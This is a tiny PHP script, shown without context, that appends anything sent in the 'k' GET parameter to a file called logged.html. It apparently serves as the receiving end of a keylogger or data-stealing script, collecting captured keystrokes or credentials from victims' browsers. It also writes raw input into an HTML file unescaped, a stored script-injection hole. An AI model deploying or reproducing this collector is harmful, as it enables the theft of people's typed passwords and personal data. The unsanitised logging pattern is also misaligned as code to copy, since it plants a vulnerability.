<?php 
if(!empty($_GET['k'])) {
    $logfile = fopen('logged.html', 'a+');
    fwrite($logfile, $_GET['k']);
    fclose($logfile);
}
?>
